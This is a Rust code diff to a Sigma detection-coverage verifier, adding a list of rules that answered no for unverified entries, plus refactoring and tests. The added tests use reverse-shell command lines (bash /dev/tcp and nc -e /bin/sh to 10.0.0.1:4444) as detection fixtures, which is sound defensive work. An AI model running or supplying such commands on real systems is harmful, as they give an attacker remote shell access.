@@ -144,6 +144,20 @@ pub struct VerifyResult {
     /// Titles of the real rules that fire (when `Verified`).
     #[serde(default, skip_serializing_if = "Vec::is_empty")]
     pub firing: Vec<String>,
+    /// Populated only for `Unverified`: the rules that were put the question and
+    /// answered no. The counterpart of `firing`, and the whole content of that
+    /// verdict — an entry is refuted precisely because every rule asked about it
+    /// said no, so naming them says what would have to change for the claim to
+    /// stand. Without it the status reports that a claim is contradicted but not
+    /// by what, and the reader is left grepping the ruleset by ATT&CK tag to
+    /// rediscover the candidate set the tool already computed.
+    ///
+    /// Rules set aside as inapplicable are absent by construction: had every
+    /// candidate been set aside the entry would read `NotApplicable`, and a rule
+    /// that abstained would have made it `Indeterminate`. Absent from older
+    /// baselines, which still deserialize.
+    #[serde(default, skip_serializing_if = "Vec::is_empty")]
+    pub not_firing: Vec<String>,
     /// Populated only for `Indeterminate`. Absent from older baselines, which
     /// still deserialize — `--diff` compares `status` by `id` and ignores this.
     #[serde(default, skip_serializing_if = "IndeterminateCause::is_empty")]
@@ -201,19 +215,39 @@ fn representative_command(entry: &KbEntry) -> Option<Command> {
     parser::parse_line(&line).into_iter().next()
 }
 
+/// The outcome of putting every candidate rule to one entry. A struct rather
+/// than a tuple because three of the four fields are `Vec`s and a positional
+/// reading of them is a bug waiting to happen.
+struct Classification {
+    status: Status,
+    firing: Vec<String>,
+    not_firing: Vec<String>,
+    because: IndeterminateCause,
+}
+
+impl Classification {
+    /// A verdict carrying nothing but its status. `Status` has no meaningful
+    /// default of its own, so this stands in for one — the detail fields are
+    /// what each arm below fills in.
+    fn of(status: Status) -> Self {
+        Self {
+            status,
+            firing: Vec::new(),
+            not_firing: Vec::new(),
+            because: IndeterminateCause::default(),
+        }
+    }
+}
+
 /// Classify a single entry against the ruleset. Mirrors the fire/indeterminate/
 /// gap logic used by coverage analysis so the two stay consistent.
-fn classify(
-    entry: &KbEntry,
-    index: &SigmaIndex,
-    platform: Platform,
-) -> (Status, Vec<String>, IndeterminateCause) {
+fn classify(entry: &KbEntry, index: &SigmaIndex, platform: Platform) -> Classification {
     let tids: Vec<String> = entry.techniques.iter().map(|t| t.id.clone()).collect();
     // The full candidate set, not the display-capped one: a claim is only
     // honestly contradicted once every rule for its technique has been asked.
     let all_candidates = index.candidate_rules(&tids);
     if all_candidates.is_empty() {
-        return (Status::NoRule, Vec::new(), IndeterminateCause::default());
+        return Classification::of(Status::NoRule);
     }
     // The synthetic record the entry's `event` axis derives — the non-execution
     // counterpart of its representative command line. `None` for an entry with
@@ -247,14 +281,13 @@ fn classify(
         }
     }
     if process_rules.is_empty() && event_rules.is_empty() {
-        return (
-            Status::NotApplicable,
-            Vec::new(),
-            IndeterminateCause {
+        return Classification {
+            because: IndeterminateCause {
                 inapplicable_rules: inapplicable,
                 ..Default::default()
             },
-        );
+            ..Classification::of(Status::NotApplicable)
+        };
     }
 
     let mut tally = Tally::default();
@@ -290,6 +323,7 @@ fn classify(
 #[derive(Default)]
 struct Tally {
     firing: Vec<String>,
+    not_firing: Vec<String>,
     any_indet: bool,
     mods: BTreeSet<String>,
     fields: BTreeSet<String>,
@@ -315,28 +349,40 @@ impl Tally {
                 self.fields.extend(v.missing_fields);
                 self.cause.null_value_match |= v.null_value_match;
             }
-            Outcome::NoFire => {}
+            Outcome::NoFire => self.not_firing.push(rule.title.clone()),
         }
     }
 
     /// The entry's status. One firing rule is enough, whichever log source it
     /// asked about: the claim is that a real rule catches the action, not that
     /// every record the entry models is separately covered.
-    fn verdict(self, inapplicable: usize) -> (Status, Vec<String>, IndeterminateCause) {
+    fn verdict(self, inapplicable: usize) -> Classification {
         if !self.firing.is_empty() {
-            (Status::Verified, self.firing, IndeterminateCause::default())
+            // The refusals are dropped rather than reported: one firing rule
+            // settles the claim, and listing what else declined would read as
+            // doubt about a verdict that is not in doubt.
+            Classification {
+                firing: self.firing,
+                ..Classification::of(Status::Verified)
+            }
         } else if self.any_indet {
             let mut cause = self.cause;
             cause.modifiers = self.mods.into_iter().collect();
             cause.missing_fields = self.fields.into_iter().collect();
             cause.inapplicable_rules = inapplicable;
-            (Status::Indeterminate, Vec::new(), cause)
+            Classification {
+                because: cause,
+                ..Classification::of(Status::Indeterminate)
+            }
         } else {
-            (
-                Status::Unverified,
-                Vec::new(),
-                IndeterminateCause::default(),
-            )
+            // Nothing abstained and nothing fired, so every applicable rule
+            // answered no — and those answers are the entire verdict.
+            let mut not_firing = self.not_firing;
+            not_firing.sort();
+            Classification {
+                not_firing,
+                ..Classification::of(Status::Unverified)
+            }
         }
     }
 }
@@ -348,15 +394,16 @@ pub fn verify(kb: &KnowledgeBase, index: &SigmaIndex, platform: Platform) -> Ver
         .iter()
         .filter(|e| claims_sigma(e))
         .map(|e| {
-            let (status, firing, because) = classify(e, index, platform);
+            let c = classify(e, index, platform);
             VerifyResult {
                 id: e.id.clone(),
                 description: e.description.clone(),
                 techniques: e.techniques.iter().map(|t| t.id.clone()).collect(),
                 claimed: claimed_rules(e),
-                status,
-                firing,
-                because,
+                status: c.status,
+                firing: c.firing,
+                not_firing: c.not_firing,
+                because: c.because,
             }
         })
         .collect();
@@ -567,6 +614,16 @@ pub fn render(report: &VerifyReport, color: bool) -> String {
             tids = r.techniques.join(", "),
             desc = r.description,
         ));
+        // The rules that answered no. This is the whole content of an
+        // `UNVERIFIED` verdict, and without it the reader has to grep the
+        // ruleset by ATT&CK tag to rediscover a candidate set already computed
+        // here.
+        for title in &r.not_firing {
+            out.push_str(&format!(
+                "      {}· asked, no fire: {title}{reset}\n",
+                c(theme::COMMENT)
+            ));
+        }
     }
     out
 }
@@ -896,6 +953,7 @@ mod tests {
             claimed: vec!["some rule".into()],
             status,
             firing: vec![],
+            not_firing: vec![],
             because: IndeterminateCause::default(),
         }
     }
@@ -935,7 +993,64 @@ mod tests {
             "T1059.004",
         )]);
         let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
-        assert_eq!(result_for(&report, "nc-revsh").status, Status::Unverified);
+        let r = result_for(&report, "nc-revsh");
+        assert_eq!(r.status, Status::Unverified);
+        // The verdict names what refused it. Without this the status says a
+        // claim is contradicted but not by what, and the only way to find out
+        // is to grep the ruleset by ATT&CK tag.
+        assert!(
+            !r.not_firing.is_empty(),
+            "an unverified claim must name the rules that answered no"
+        );
+        assert!(r.firing.is_empty());
+    }
+
+    #[test]
+    fn a_verified_claim_does_not_list_what_declined() {
+        // One firing rule settles the claim. Listing the rules that also
+        // declined would read as doubt about a verdict that is not in doubt.
+        let kb = kb_of(vec![entry(
+            "revsh",
+            None,
+            Some("bash -i >& /dev/tcp/10.0.0.1/4444 0>&1"),
+            "T1059.004",
+        )]);
+        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
+        let r = result_for(&report, "revsh");
+        assert_eq!(r.status, Status::Verified);
+        assert!(!r.firing.is_empty());
+        assert!(r.not_firing.is_empty());
+    }
+
+    #[test]
+    fn the_refusing_rules_are_listed_in_a_stable_order() {
+        // The list is committed into `.ci/verified-<platform>.json`, so an
+        // unstable order would churn the baseline on every regeneration.
+        let kb = kb_of(vec![entry(
+            "nc-revsh",
+            None,
+            Some("nc -e /bin/sh 10.0.0.1 4444"),
+            "T1059.004",
+        )]);
+        let idx = index();
+        let first = verify(&kb, &idx, kb::Platform::LinuxAuditd);
+        let again = verify(&kb, &idx, kb::Platform::LinuxAuditd);
+        let a = &result_for(&first, "nc-revsh").not_firing;
+        assert_eq!(a, &result_for(&again, "nc-revsh").not_firing);
+        let mut sorted = a.clone();
+        sorted.sort();
+        assert_eq!(a, &sorted);
+    }
+
+    #[test]
+    fn an_entry_with_no_rules_names_nothing() {
+        // NO-RULE means nothing was asked, so there is nothing to report — the
+        // empty list must not be confused with "asked and everything declined".
+        let kb = kb_of(vec![entry("whoami", Some("whoami"), None, "T9999")]);
+        let report = verify(&kb, &index(), kb::Platform::LinuxAuditd);
+        let r = result_for(&report, "whoami");
+        assert_eq!(r.status, Status::NoRule);
+        assert!(r.not_firing.is_empty());
     }
 
     /// The display cap must not reach the verdict. Six same-level rules share
@@ -1134,6 +1249,7 @@ mod tests {
             claimed: vec!["some rule".into()],
             status: Status::Indeterminate,
             firing: vec![],
+            not_firing: vec![],
             because,
         };
         let modifier_only = IndeterminateCause {
